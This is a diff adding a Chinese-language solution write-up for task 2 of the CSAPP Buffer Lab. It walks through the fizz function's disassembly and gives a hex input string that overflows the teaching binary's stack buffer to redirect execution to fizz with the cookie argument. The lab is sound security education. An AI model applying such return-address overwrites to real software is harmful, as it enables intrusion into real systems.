@@ -131,3 +131,89 @@ cat task1.txt | ./hex2raw | ./bufbomb -u bovik
 
 ![res-task1](/mnt/projects/CSAPP-Assignments/my-solution/4-Buffer-Lab-IA32/buflab32-handout/buflab-handout/res-task1.png)
 
+
+
+2. task2
+
+和task1非常接近，只需要考虑把参数放在栈的哪个位置，首先来看fizz函数的代码：
+
+```c
+void fizz(int val)
+{
+	if (val == cookie) {
+		printf("Fizz!: You called fizz(0x%x)\n", val);
+		validate(1);
+	} else
+		printf("Misfire: You called fizz(0x%x)\n", val);
+	exit(0);
+}
+```
+
+看其汇编版本：
+
+```
+(gdb) disas fizz
+Dump of assembler code for function fizz:
+   0x08048c42 <+0>:		push   %ebp
+   0x08048c43 <+1>:		mov    %esp,%ebp
+   0x08048c45 <+3>:		sub    $0x18,%esp
+   0x08048c48 <+6>:		mov    0x8(%ebp),%eax
+   0x08048c4b <+9>:		cmp    0x804d108,%eax
+   0x08048c51 <+15>:	jne    0x8048c79 <fizz+55>
+   0x08048c53 <+17>:	mov    %eax,0x8(%esp)
+   0x08048c57 <+21>:	movl   $0x804a4ee,0x4(%esp)
+   0x08048c5f <+29>:	movl   $0x1,(%esp)
+   0x08048c66 <+36>:	call   0x80489c0 <__printf_chk@plt>
+   0x08048c6b <+41>:	movl   $0x1,(%esp)
+   0x08048c72 <+48>:	call   0x804937b <validate>
+   0x08048c77 <+53>:	jmp    0x8048c91 <fizz+79>
+   0x08048c79 <+55>:	mov    %eax,0x8(%esp)
+   0x08048c7d <+59>:	movl   $0x804a340,0x4(%esp)
+   0x08048c85 <+67>:	movl   $0x1,(%esp)
+   0x08048c8c <+74>:	call   0x80489c0 <__printf_chk@plt>
+   0x08048c91 <+79>:	movl   $0x0,(%esp)
+   0x08048c98 <+86>:	call   0x8048900 <exit@plt>
+End of assembler dump.
+```
+
+在<+9>处执行的就是if (val == cookie)这个比较逻辑，也就是说让%eax中存着cookie就行，然后%eax中的值就是：
+
+```
+mov    0x8(%ebp),%eax
+```
+
+而ebp的值：
+
+```
+mov    %esp,%ebp
+```
+
+也就是说在ret时栈顶的位置+8
+
+所以输入字符串的栈结构应为：
+
+![stack-task-2](/mnt/projects/CSAPP-Assignments/my-solution/4-Buffer-Lab-IA32/buflab32-handout/buflab-handout/stack-task-2.png)
+
+那么输入字符串就是：
+
+```
+00 00 00 00 
+00 00 00 00
+00 00 00 00 
+00 00 00 00
+00 00 00 00 
+00 00 00 00
+00 00 00 00 
+00 00 00 00
+00 00 00 00 
+00 00 00 00
+00 00 00 00 
+42 8c 04 08
+00 00 00 00
+b7 b2 05 10
+```
+
+测试结果：
+
+![res-task2](/mnt/projects/CSAPP-Assignments/my-solution/4-Buffer-Lab-IA32/buflab32-handout/buflab-handout/res-task2.png)
+
